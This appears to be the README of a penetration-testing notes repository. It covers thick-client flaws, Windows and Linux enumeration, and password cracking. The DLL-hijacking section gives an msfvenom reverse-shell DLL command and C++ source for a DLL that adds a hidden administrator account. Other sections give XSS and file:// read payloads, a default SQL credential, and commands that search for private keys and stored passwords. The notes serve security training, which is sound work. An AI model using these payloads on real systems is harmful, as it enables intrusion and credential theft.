```ruby
███████╗ █████╗ ███████╗██╗   ██╗ ██████╗
██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝
█████╗  ███████║███████╗ ╚████╔╝ ██║  ███╗
██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ██║   ██║
███████╗██║  ██║███████║   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝
Made with <3 by Riccardo Malatesta (@seeu)
```
[![License](https://img.shields.io/github/license/seeu-inspace/easyg)](LICENSE)
[![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/ellerbrock/open-source-badges/)

EasyG started out as a script that I use to automate some information gathering tasks for my hacking process, [you can find it here](scripts/). Now it's more than that. Here I gather all the resources about hacking that I find interesting: notes, payloads, tools and more.

I try as much as possible to link to the various sources or inspiration for these notes. A large part of these notes are from: [PTS v4](https://blog.elearnsecurity.com/introducing-the-ptsv4-training-course.html), [PortSwigger Web Security Academy](https://portswigger.net/web-security), [PEN-200](https://www.offsec.com/courses/pen-200/), [Proving Grounds](https://www.offsec.com/labs/individual/), ["Attacking and Defending Active Directory Lab (CRTP)" by Altered Security](https://www.alteredsecurity.com/adlab), [TryHackMe](https://tryhackme.com/), [Hack The Box](https://hackthebox.com/), [PentesterLab](https://pentesterlab.com/), [HackTricks](https://book.hacktricks.xyz/), [Jhaddix](https://twitter.com/Jhaddix), [The Cyber Mentor](https://www.thecybermentor.com/), [NahamSec](https://www.youtube.com/@NahamSec) (and [NahamCon](https://www.nahamcon.com/)), InfoSec Twitter and many other amazing people.

## Table of Contents

- [Resources](resources/#resources)
- [Useful tips](useful-tips/#useful-tips)
  - [Glossary](useful-tips/#glossary)
  - [Client-specific key areas of concern](useful-tips/#client-specific-key-areas-of-concern)
  - [General notes](useful-tips/#general-notes)
    - [Default Credentials](useful-tips/#default-credentials)
    - [PT initial foothold](useful-tips/#pt-initial-foothold)
    - [SSH notes](useful-tips/#ssh-notes)
    - [FTP notes](useful-tips/#ftp-notes)
    - [Git commands / shell](useful-tips/#git-commands--shell)
    - [Remote Desktop](useful-tips/#remote-desktop)
    - [SQL connections](useful-tips/#sql-connections)
    - [Reverse engineering](useful-tips/#reverse-engineering)
    - [File upload](useful-tips/#file-upload)
    - [Shells](useful-tips/#shells)
- [Check-lists](check-lists/#check-lists)
  - [Toolset](check-lists/#toolset) 
  - [Testing layers](check-lists/#testing-layers)
  - [Penetration Testing cycle](check-lists/#penetration-testing-cycle)
  - [Penetration Testing process](check-lists/#penetration-testing-process)
  - [Bug Bounty Hunting](check-lists/#bug-bounty-hunting)
    - [Top vulnerabilities to always look for](check-lists/#top-vulnerabilities-to-always-look-for)
    - [Multiple targets](check-lists/#multiple-targets)
    - [Single target](check-lists/#single-target)
- [Linux](linux/#linux)
- [Tools](tools/#tools)
  - [EasyG](tools/#easyg)
  - [Burp Suite](tools/#burp-suite)
  - [Netcat](tools/#netcat)
  - [Socat](tools/#socat)
  - [PowerShell](tools/#powershell)
  - [WireShark](tools/#wireshark)
  - [Tcpdump](tools/#tcpdump)
  - [Bash scripting](tools/#bash-scripting)
  - [Metasploit Framework](tools/#metasploit-framework)
    - [Starting Metasploit](tools/#starting-metasploit)
    - [MSF Syntax](tools/#msf-syntax)
    - [Exploit Modules](tools/#exploit-modules)
    - [Post-Exploitation](tools/#post-exploitation)
  - [Others](tools/#others)
- [Passive Information Gathering (OSINT)](passive-information-gathering-osint/#passive-information-gathering-osint)
  - [Notes](passive-information-gathering-osint/#notes)
  - [Tools](passive-information-gathering-osint/#tools)
  - [Target validation](passive-information-gathering-osint/#target-validation)
  - [User Information Gathering](passive-information-gathering-osint/#user-information-gathering)
- [Active Information Gathering](active-information-gathering/#active-information-gathering)
  - [DNS Enumeration](active-information-gathering/#dns-enumeration)
  - [Port Scanning](active-information-gathering/#port-scanning)
    - [Netcat](active-information-gathering/#netcat)
    - [Nmap](active-information-gathering/#nmap)
    - [Masscan](active-information-gathering/#masscan)
    - [Other tools](active-information-gathering/#other-tools)
  - [SMB Enumeration](active-information-gathering/#smb-enumeration)
  - [NFS Enumeration](active-information-gathering/#nfs-enumeration)
  - [SNMP Enumeration](active-information-gathering/#snmp-enumeration)
  - [HTTP / HTTPS enumeration](active-information-gathering/#http--https-enumeration)
  - [SSH enumeration](active-information-gathering/#ssh-enumeration)
- [Content Discovery](content-discovery/#content-discovery)
  - [Google Dorking](content-discovery/#google-dorking)
  - [GitHub Dorking](content-discovery/#github-dorking)
  - [Shodan Dorking](content-discovery/#shodan-dorking)
- [Networking](networking/#networking)
- [Source code review](source-code-review/#source-code-review)
- [Vulnerability Scanning](vulnerability-scanning/#vulnerability-scanning)
  - [Nessus](vulnerability-scanning/#nessus)
  - [Nmap](vulnerability-scanning/#nmap)
  - [Nikto](vulnerability-scanning/#nikto)
  - [Nuclei](vulnerability-scanning/#nuclei)
- [Web vulnerabilities](web-vulnerabilities/#web-vulnerabilities)
  - [SQL Injection](web-vulnerabilities/#sql-injection)
  - [Authentication vulnerabilities](web-vulnerabilities/#authentication-vulnerabilities)
  - [Directory Traversal](web-vulnerabilities/#directory-traversal)
  - [File inclusion](web-vulnerabilities/#file-inclusion)
  - [OS Command Injection](web-vulnerabilities/#os-command-injection)
  - [Business logic vulnerabilities](web-vulnerabilities/#business-logic-vulnerabilities)
  - [Information Disclosure](web-vulnerabilities/#information-disclosure)
  - [Access control vulnerabilities and privilege escalation](web-vulnerabilities/#access-control-vulnerabilities-and-privilege-escalation)
  - [File upload vulnerabilities](web-vulnerabilities/#file-upload-vulnerabilities)
    - [Web shells](useful-tips#shells)
  - [Server-side request forgery (SSRF)](web-vulnerabilities/#server-side-request-forgery-ssrf)
  - [Open redirection](web-vulnerabilities/#open-redirection)
  - [XXE injection](web-vulnerabilities/#xxe-injection)
  - [Cross-site scripting (XSS)](web-vulnerabilities/#cross-site-scripting-xss)
  - [Cross-site request forgery (CSRF)](web-vulnerabilities/#cross-site-request-forgery-csrf)
  - [Cross-origin resource sharing (CORS)](web-vulnerabilities/#cross-origin-resource-sharing-cors)
  - [Clickjacking](web-vulnerabilities/#clickjacking)
  - [DOM-based vulnerabilities](web-vulnerabilities/#dom-based-vulnerabilities)
  - [WebSockets](web-vulnerabilities/#websockets)
  - [Insecure deserialization](web-vulnerabilities/#insecure-deserialization)
  - [Server-side template injection](web-vulnerabilities/#server-side-template-injection)
  - [Web cache poisoning](web-vulnerabilities/#web-cache-poisoning)
  - [HTTP Host header attacks](web-vulnerabilities/#http-host-header-attacks)
  - [HTTP request smuggling](web-vulnerabilities/#http-request-smuggling)
  - [OAuth authentication](web-vulnerabilities/#oauth-authentication)
  - [JWT Attacks](web-vulnerabilities/#jwt-attacks)
  - [GraphQL](web-vulnerabilities/#graphql)
  - [WordPress](web-vulnerabilities/#wordpress)
  - [IIS - Internet Information Services](web-vulnerabilities/#iis---internet-information-services)
  - [Microsoft SharePoint](web-vulnerabilities/#microsoft-sharepoint)
  - [Lotus Domino](web-vulnerabilities/#lotus-domino)
  - [phpLDAPadmin](web-vulnerabilities/#phpLDAPadmin)
  - [Git source code exposure](web-vulnerabilities/#git-source-code-exposure)
  - [Subdomain takeover](web-vulnerabilities/#subdomain-takeover)
  - [4** Bypass](web-vulnerabilities/#4-bypass)
  - [Application level Denial of Service](web-vulnerabilities/#application-level-denial-of-service)
  - [APIs attacks](web-vulnerabilities/#apis-attacks)
  - [Grafana attacks](web-vulnerabilities/#grafana-attacks)
  - [Confluence attacks](web-vulnerabilities/#confluence-attacks)
  - [Kibana](web-vulnerabilities/#kibana)
  - [Argus Surveillance DVR](web-vulnerabilities/#argus-surveillance-dvr)
  - [Shellshock](web-vulnerabilities/#shellshock)
  - [Cassandra web](web-vulnerabilities/#cassandra-web)
  - [RaspAP](web-vulnerabilities/#raspap)
  - [Drupal](web-vulnerabilities/#drupal)
  - [Tomcat](web-vulnerabilities/#tomcat)
  - [Booked Scheduler](web-vulnerabilities/#booked-scheduler)
  - [phpMyAdmin](web-vulnerabilities/#phpmyadmin)
  - [PHP](web-vulnerabilities/#php)
  - [Symphony](web-vulnerabilities/#symphony)
  - [Adobe ColdFusion](web-vulnerabilities/#adobe-coldfusion)
  - [Webmin](web-vulnerabilities/#webmin)
  - [Broken Link Hijacking](web-vulnerabilities/#broken-link-hijacking)
- [Client-Side Attacks](client-side-attacks/#client-side-attacks)
  - [Client Information Gathering](client-side-attacks/#client-information-gathering)
  - [HTML applications](client-side-attacks/#html-applications)
  - [Microsoft Office](client-side-attacks/#microsoft-office)
  - [Windows Library Files](client-side-attacks/#windows-library-files)
  - [McAfee](client-side-attacks/#mcafee)
- [Server-side Attacks](server-side-attacks/#server-side-attacks)
  - [NFS](server-side-attacks/#nfs)
  - [IKE - Internet Key Exchange](server-side-attacks/#ike---internet-key-exchange)
  - [SNMP](server-side-attacks/#snmp)
  - [NodeJS](server-side-attacks/#nodejs)
  - [Python](server-side-attacks/#python)
  - [Redis 6379](server-side-attacks/#redis-6379)
  - [Oracle TNS](server-side-attacks/#oracle-tns)
  - [Memcached](server-side-attacks/#memcached)
  - [SMTP / IMAP](server-side-attacks/#smtp--imap)
  - [113 ident](server-side-attacks/#113-ident)
  - [FreeSWITCH](server-side-attacks/#freeswitch)
  - [Umbraco](server-side-attacks/#umbraco)
  - [VoIP penetration test](server-side-attacks/#voip-penetration-test)
  - [DNS](server-side-attacks/#dns)
- [Thick client vulnerabilities](#thick-client-vulnerabilities)
  - [DLL Hijacking](#dll-hijacking)
  - [Insecure application design](#insecure-application-design)
  - [Weak Hashing Algorithms](#weak-hashing-algorithms)
  - [Cleartext secrets in memory](#cleartext-secrets-in-memory)
  - [Hardcoded secrets](#hardcoded-secrets)
  - [Unsigned binaries](#unsigned-binaries)
  - [Lack of verification of the server certificate](#lack-of-verification-of-the-server-certificate)
  - [Insecure SSL/TLS configuration](#insecure-ssltls-configuration)
  - [Remote Code Execution via Citrix Escape](#remote-code-execution-via-citrix-escape)
  - [Direct database access](#direct-database-access)
  - [Insecure Windows Service permissions](#insecure-windows-service-permissions)
  - [Code injection](#code-injection)
  - [Windows persistence](#windows-persistence)
- [System Attacks](#system-attacks)
  - [Information gathering](#information-gathering)
    - [Windows](#windows)
    - [Linux](#linux-1)
  - [Password Attacks](#password-attacks)
    - [Wordlists](#wordlists)
    - [Password Cracking](#password-cracking)
    - [Network Service Attack](#network-service-attack)
    - [Leveraging Password Hashes](#leveraging-password-hashes)
  - [Port Redirection and Tunneling](#port-redirection-and-tunneling)
    - [Port Forwarding](#port-forwarding)
    - [SSH Tunneling](#ssh-tunneling)
    - [ssh.exe](#sshexe)
    - [Plink.exe](#plinkexe)
    - [Netsh](#netsh)
    - [Chisel](#chisel)
    - [DNS Tunneling](#dns-tunneling)
    - [Metasploit Portfwd](#metasploit-portfwd)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [Resources](#resources-2)
    - [Strategy](#strategy)
    - [Reverse Shell](#reverse-shell)
    - [Service Exploits](#service-exploits)
    - [Weak File Permissions](#weak-file-permissions)
    - [Exposed Confidential Information](#exposed-confidential-information)
    - [SSH](#ssh)
    - [Sudo](#sudo)
    - [Cron Jobs](#cron-jobs)
    - [SUID / SGID Executables](#suid--sgid-executables)
    - [Passwords & Keys](#passwords--keys)
    - [Kernel Exploits](#kernel-exploits)
    - [find with exec](#find-with-exec)
    - [find PE](#find-pe)
    - [Abusing capabilities](#abusing-capabilities)
    - [Escape shell](#escape-shell)
    - [Docker](#docker)
    - [User groups](#user-groups)
    - [fail2ban](#fail2ban)
    - [Postfix](#postfix)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [Resources](#resources-3)
    - [Strategy](#strategy-1)
    - [Privileges](#privileges)
    - [Privileged Groups](#privileged-groups)
    - [Add new admin user](#add-new-admin-user)
    - [Log in with another user from the same machine](#log-in-with-another-user-from-the-same-machine)
    - [Generate a reverse shell](#generate-a-reverse-shell)
    - [Kernel Exploits](#kernel-exploits-1)
    - [Driver Exploits](#driver-exploits)
    - [Service Exploits](#service-exploits-1)
    - [CVEs](#cves)
    - [User Account Control (UAC)](#user-account-control-uac)
    - [Insecure File Permissions](#insecure-file-permissions)
    - [Registry](#registry)
    - [Passwords](#passwords)
    - [Scheduled Tasks](#scheduled-tasks)
    - [Installed Applications](#installed-applications)
    - [Startup Apps](#startup-apps)
    - [Hot Potato](#hot-potato)
    - [Token Impersonation](#token-impersonation)
    - [getsystem](#getsystem)
    - [Pass The Hash](#pass-the-hash-1)
    - [Pass The Password](#pass-the-password)
    - [Apache lateral movement](#apache-lateral-movement)
    - [Read data stream](#read-data-stream)
    - [PrintNightmare](#printnightmare)
    - [Bypass CLM / CLM breakout | CLM / AppLocker Break Out](#bypass-clm--clm-breakout--clm--applocker-break-out)
    - [From Local Admin to System](#from-local-admin-to-system)
    - [TeamViewer](#teamviewer)
    - [Exploiting service through Symbolic Links](#exploiting-service-through-symbolic-links)
    - [Write privileges](#write-privileges)
    - [Services running - Autorun](#services-running---autorun)
    - [CEF Debugging Background](#cef-debugging-background)
    - [Feature Abuse](#feature-abuse)
  - [Buffer Overflow](#buffer-overflow)
  - [Antivirus Evasion](#antivirus-evasion)
    - [ToDo](#todo)
    - [With Evil-WinRM](#with-evil-winrm)
    - [Thread Injection](#thread-injection)
    - [Shellter](#shellter)
  - [Active Directory](#active-directory)
    - [Notes](#notes-2)
    - [Initial foothold](#initial-foothold)
    - [Manual Enumeration](#manual-enumeration)
    - [SMB](#smb)
    - [RPC](#rpc)
    - [Azure](#azure)
    - [LDAP](#ldap)
    - [PowerView](#powerview)
    - [PsLoggedOn](#psloggedon)
    - [Service Principal Names Enumeration](#service-principal-names-enumeration)
    - [Object Permissions Enumeration](#object-permissions-enumeration)
    - [Domain Shares Enumeration](#domain-shares-enumeration)
    - [SharpHound](#sharphound)
    - [BloodHound](#bloodhound)
    - [Mimikatz](#mimikatz-1)
    - [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
    - [Lateral Movement Techniques and Pivoting](#lateral-movement-techniques-and-pivoting)
    - [Credentials Harvesting](#credentials-harvesting)
    - [Offensive .NET](#offensive-net)
    - [Active Directory Persistence](#active-directory-persistence)
    - [Active Directory Privilege Escalation](#active-directory-privilege-escalation)
- [Mobile](#mobile)
  - [Missing Certificate and Public Key Pinning](#missing-certificate-and-public-key-pinning)
  - [Cordova attacks](#cordova-attacks)
- [Cloud hacking](#cloud-hacking)
  - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
  - [AWS Cognito](#aws-cognito)
  - [Google Cloud Storage bucket](#google-cloud-storage-bucket)
- [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
  - [Prompt Injection](#prompt-injection)



## Thick client vulnerabilities

### <ins>DLL Hijacking</ins>

**Tool**
- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking

**Process**
1. Use winPEAS to enumerate non-Windows services: `.\winPEASany.exe quiet servicesinfo`
2. Enumerate which of these services our user has stop and start access to `.\accesschk.exe /accepteula -uvqc user <service>`
3. Once it's found wich service is vulnerable to dll hijacking, find the executable's path with `sc qc dllsvc`
4. Using Process Monitor, add these the filters to find missing dlls.
   <img src="img/procmon-config-add.png" alt="procmon-config">
5. Generate a reverse shell DLL named hijackme.dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijackme.dll`
6. Run again the vulnerable service: `net stop <service>` and `net start dllsvc`

**Another example of a dll**:
```c++
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // Perform initialization tasks for the DLL when it is loaded
	    
	    int i;
  	    i = system ("net user eviladmin Ev!lpass /add");
  	    i = system ("net localgroup administrators eviladmin /add");
	    
            break;
        case DLL_PROCESS_DETACH:
            // Perform cleanup tasks for the DLL when it is unloaded
            break;
        case DLL_THREAD_ATTACH:
            // Perform initialization tasks for each new thread that loads the DLL
            break;
        case DLL_THREAD_DETACH:
            // Perform cleanup tasks for each thread that unloads the DLL
            break;
    }
    return TRUE;
}
```
- `x86_64-w64-mingw32-gcc dllh.cpp --shared -o dllh.dll`

**Resources**
- [hijacklibs.net](https://hijacklibs.net/)
- [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)
- [Spartacus DLL Hijacking](https://github.com/Accenture/Spartacus)



### <ins>Insecure application design</ins>

The application design is based on a two-tier architecture. In particular, the thick client application installed on the workstation communicates directly with a backend DBMS without the use of an application server.

The best option, from a security perspective, is designing and implementing a three-tier architecture in which the thick client connects with an intermediary layer (an application server), which in turn communicates with the database. A secure channel must be used for all communications, with only secure protocols (such TLS, HTTPS, etc.), and preferebli with Certificate Pinning.

If this is not possible, it is desirable to provide read-only users and read/write users distinct privileges at the DBMS layer. This would stop vertical privilege escalation even if a read-only user were to access the database directly and try to edit the data.



### <ins>Weak Hashing Algorithms</ins>

Sensitive data exposure, key leakage, broken authentication, insecure sessions, and spoofing attacks can all be caused by improper application of encryption methods. Some hashing or encryption techniques, such MD5 and RC4, are known to be insecure and are not advised for use.

When dealing with hashing algorithms, the strongest algorithm available should be used (e.g., SHA-512 or at least SHA-256). However, it is always crucial to take into account the precise context in which the hashing algorithm must be used. For instance, it is recommended to utilize contemporary hashing algorithms that have been created especially for securely saving passwords when managing passwords. This indicates that they should be slow (as opposed to fast algorithms like MD5 and SHA-1), and that can be configured by changing the work factor (e.g., PBKDF2 or Bcrypt)

If not configured correctly, the encryption can be not sufficiently secure. An example with AES, an algorithm for symmetric encryption:
- Cipher-Block-Chaining (CBC) is no longer considered safe when verifiable padding has been applied without first ensuring the integrity of the ciphertext, except for very specific circumstances. If implemented, it can weakens AES encryption.



### <ins>Cleartext secrets in memory</ins>

The memory analysis of an application, done when the thick client process is running, can highlight the presence of secrets in cleartext and that can be therefore extracted by any user having access to the machine where the application is hosted.

**Resource**
- [Process Hacker](https://processhacker.sourceforge.io/) It helps to dump the exe memory and see what sensitive data is there



### <ins>Hardcoded secrets</ins>

Sometimes, the thick client application's source code is not obfuscated, therefore a hostile user may decompile it and easily comprehend every functionality of the application. It's also possible that more can be found, like credentials and api keys.

**Resources**
- [VB Decompiler](https://www.vb-decompiler.org/products.htm) decompile a VB application
- [ILSpy](https://github.com/icsharpcode/ILSpy) | [dnSpy](https://github.com/dnSpy/dnSpy) .NET decompilers



### <ins>Unsigned binaries</ins>

If an application executable, and/or the imported DLLs, has not been digitally signed, it's possible replace it with a tampered version without the user noticing.

**Resource**
- [Sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck) check the signature of an executable



### <ins>Lack of verification of the server certificate</ins>

Due to the fact that the client does not verify the TLS certificate presented by the back-end, it's possible to intercept also HTTPS communications managed by the thick client application.

Without effective certificate control, an attacker who is capable of conducting a Man in the Middle attack can provide a self-signed certificate and the application will accept it, invalidating the protection provided by the TLS connection.



### <ins>Insecure SSL/TLS configuration</ins>

During the SSL/TLS negotiation, SSL/TLS connections may be set up to offer outdated protocols and cipher suites that are susceptible to known security flaws. The data transmitted between the server and the client could potentially be read or modified in this case if an attacker is able to intercept the communication.

**Resource**
- [testssl.sh](https://testssl.sh/) useful for checking outdated ciphers & more



### <ins>Remote Code Execution via Citrix Escape</ins>

If Citrix is present and you have access to it, there are multiple ways you can achieve Remote Code Execution:
- Try to upload a PowerShell
- Search for a functionality that opens a dialog box. Insert the path for `cmd` and `PowerShell` and see if they pop-up
- In a dialog box, see if the right-click is allowed. Play with the functionality to achieve RCE, like creating a `.bat` and running it or upload files
- Upload [Process Hacker](https://processhacker.sourceforge.io/) and see if you find [Cleartext secrets in memory](#cleartext-secrets-in-memory)

**Resources**
- [PowerShell](https://github.com/PowerShell/Powershell)
- [Two RCEs are better than one: write-up of an interesting lateral movement](https://medium.com/@seeu-inspace/two-rces-are-better-than-one-write-up-of-an-interesting-lateral-movement-66a52d42e075)



### <ins>Direct database access</ins>

- If it's found that standard users have direct access to the database, there is the possibility for users to read and write data that is not otherwise accessible through the client application.
- If the SQL server requires a Windows User access, use the command `runas /user:localadmin <SQL-SERVER-MANAGEMENT-STUDIO>`
- Try access with the account `sa:RPSsql12345`
- Intercept the requests and see if there is an [Insecure application design](#insecure-application-design). In that case, it might be possible to perform a Direct database access, SQLi or Remote Code Execution

**Resources**
- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
- [Wireshark](https://www.wireshark.org/)



### <ins>Insecure Windows Service permissions</ins>

Windows service executable might be configured with insecure permissions. Services configured to use an executable with weak permissions are vulnerable to privilege escalation attacks.

Unprivileged users have the ability to change or replace the executable with arbitrary code, which would then be run the following time the service is launched. This can lead to privilege escalation depending on the user the service is running as.



### <ins>Code injection</ins>
- Check for classic HTML injections and [XSS](cross-site-scripting-xss)
  - Try to use a `SSID` as a vector for an XSS with a payload like `"/><img src=x onerror=alert(1)>`
- Check if `<webview>` works. If it does, it's might be possible to achieve a LFI with a payload like this `<webview src="file:///etc/passwd"></webview>`. [[Reference](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)]


### <ins>Windows persistence</ins>

**Resources**
- [persistence-info.github.io](https://persistence-info.github.io/)
- [PayloadsAllTheThings/Windows - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)

## System Attacks

### <ins>Information gathering</ins>

#### Windows

```PowerShell
<# gather information about current user #>
whoami
net user <user>
whoami /priv

<# gather user context information #>
id

<# discover other user accounts on the system #>
net user

<# discover localgroups and users in those groups#>
whoami /groups
net localgroup
net user <username>
PS C:\> Get-LocalGroupMember <group>

<# enumerate the Hostname #>
hostname

<# enumerate the Operating System Version and Architecture #>
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

<# enumerate running processes and services #>
PS C:\> Get-Process
tasklist /SVC

<# enumerate networking information #>
ipconfig /all
route print
netstat -ano

<# enumerate firewall status and rules #>
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

<# enumerate scheduled tasks #>
schtasks /query /fo LIST /v

<# enumerate installed applications and patch levels #>
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn

<# enumerate readable/writable files and directories #>
accesschk.exe -uws "Everyone" "C:\Program Files"
PS C:\> Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

<# enumerate unmounted disks #>
mountvol

<# enumerate device drivers and Kernel modules #>
PS C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

<# enumerating binaries that AutoElevate #>
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

<# find interesting files #>
Get-ChildItem -Path <PATH> -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path <PATH> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path <PATH> -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.xml,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

<# see history of commands #>
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\Public\Transcripts\transcript01.txt

<# find secrets #>
reg query HKLM /f password /t REG_SZ /s
Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt

```

To use Event Viewer to search for events recorded by Script Block Logging:
1. Open the Event Viewer:
   - Press Windows key + R to open the Run dialog box.
   - Type `eventvwr.msc` and press Enter.
2. In the Event Viewer window, expand "Applications and Services Logs"
3. Expand the "Microsoft-Windows-PowerShell/Operational" log
4. Click on the "Filter Current Log" option on the right-hand side of the window
5. In the Filter Current Log dialog box, enter "4104" as the Event ID
6. Click on the "OK" button to apply the filter
7. The Event Viewer will now display only the events related to Script Block Logging



#### Linux
```bash
# enumerate users
cat /etc/passwd

# enumerate the Hostname
hostname

# enumerate the Operating System Version and Architecture
cat /etc/issue
cat /etc/*-release
cat /etc/os-release
uname -a
uname -r
arch

# enumerate running processes and services
ps axu

# enumerate networking information
ip a
/sbin/route
routel
ss -anp

# inspect custom IP tables
cat /etc/iptables/rules.v4

# enumerate scheduled tasks
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
sudo crontab -l

# enumerate installed applications and patch levels
dpkg -l

# find all writable files
find / -writable -type d 2>/dev/null

# find all writable files in /etc
find /etc -maxdepth 1 -writable -type f

# find all readable files in /etc
find /etc -maxdepth 1 -readable -type f

# enumerate readable/writable files and directories
find / -writable -type d 2> /dev/null

# enumerate unmounted disks
cat /etc/fstab
mount
/bin/lsblk
lsblk

# enumerate device drivers and kernel modules
lsmod
/sbin/modinfo libata

# enumerating binaries that AutoElevate
find / -perm -u=s -type f 2>/dev/null

# find SSH private keys
find / -maxdepth 5 -name .ssh -exec grep -rnw {} -e 'PRIVATE' \; 2> /dev/null

```


### <ins>Password Attacks</ins>

[How Secure Is My Password?](https://howsecureismypassword.net/)

#### <ins>Wordlists</ins>
- [SecLists](https://github.com/danielmiessler/SecLists)
- [wordlists.assetnote.io](https://wordlists.assetnote.io/)
- [content_discovery_all.txt](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
- [OneListForAll](https://github.com/six2dez/OneListForAll)
- [wordlistgen](https://github.com/ameenmaali/wordlistgen)
- [Scavenger](https://github.com/0xDexter0us/Scavenger)
- [cewl](https://digi.ninja/projects/cewl.php)
  - `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
- Wordlists in kali
  - /usr/share/wordlists/seclists/Passwords/months.txt
  - /usr/share/wordlists/seclists/Passwords/seasons.txt
  - /usr/share/wordlists/metasploit/unix_passwords.txt
  - /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
  - /usr/share/wordlists/rockyou.txt

**Brute Force Wordlists**

[Crunch](https://sourceforge.net/projects/crunch-wordlist/), see [crunch | Kali Linux Tools](https://www.kali.org/tools/crunch/). 

| Placeholder |  Character translation             |
| ----------- | ---------------------------------- |
| @           | Lower case alpha characters        |
| ,           | Upper case alpha characters        |
| %           | Numeric characters                 |
| ^           | Special characters including space |

Examples of usage:
- Structure of the passwords of the target: `[Capital Letter] [2 x lower case letters] [2 x special chars] [3 x numeric]`. Run `crunch 8 8 -t ,@@^^%%%`
- Passwords between four and six characters in length, containing only the characters 0-9 and A-F: `crunch 4 6 0123456789ABCDEF -o crunch.txt`
- Use a pre-defined character-set with `-f` and include `mixalpha` to  include all lower and upper case letters `crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`

**Mutating wordlists**

When password policies are implemented, it is helpful to remove password policies that are guaranteed to fail from the worlist. Starting from a wordlist called `demo.txt`
- `sed -i '/^1/d' demo.txt` remove all number sequences

Many people just append a "1" to the end of an existing password when creating a password with a number value. Create a rule file with $1 that adds a "1" to each password in our wordlist.
- Add a rule for hashcat with `echo \$1 > demo.rule`

Many people have a tendency to capitalize the initial character in a password when they are required to use an upper case character.
- Add a rule with `echo '$1\nc' > demo.rule`
  - Note: each line in the file is interpreted as a new rule

For special characters:
- `$1 c $!` to have `Password1!`
- `$! $1 c` to have `Password!1`

Other rules
- Test the rules with `hashcat -r demo.rule --stdout demo.txt`
- `/usr/share/hashcat/rules` in Kali
- See: [rule_based_attack [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

#### Password Decrypts
- https://github.com/frizb/PasswordDecrypts
- ```
  "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
  msf5 > irb
  key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
  require 'rex/proto/rfb'
  Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
  ```
- `aes_decrypt.py`
  - you need the key + iv to decrypt an encoded base64

#### <ins>Password Cracking</ins>

**Tools**
- [John the Ripper](https://www.openwall.com/john/)
- [Hashcat](https://hashcat.net/hashcat/)
- [Ophcrack](https://ophcrack.sourceforge.io/)

#### John the Ripper
- `john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt user.hash`
- Note for Linux-based systems: first use the unshadow utility to combine the passwd and shadow files from the compromised system `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
- `john -incremental -users:<user list> <file to crack>` pure brute force attack, you can use `-user:<username>` to target a specific user
- `john --show crackme` display the passwords recovered
- `john --wordlist=<custom wordlist file> -rules <file to crack>` dictionary attack, use `-wordlist` instead of `--wordlist=<custom wordlist file>` to use the john default wordlist
- `john hash.txt --format=NT` simple attack to attack NT hashes
- `john --rules --wordlist=<custom wordlist file> hash.txt --format=NT` using password mutation rules
- `john --rules --wordlist=<custom wordlist file> unshadowed.txt`
- To distribute the load and speed up the cracking process (for multi core CPUs)
  1. Use the options `--fork=8` and `--node=1-8/16` on the first machine
  2. Use the options `--fork=8` and `--node=9-16/16` on the first machine

#### Hashcat

- `hashcat --help | grep -i "sha-256"`
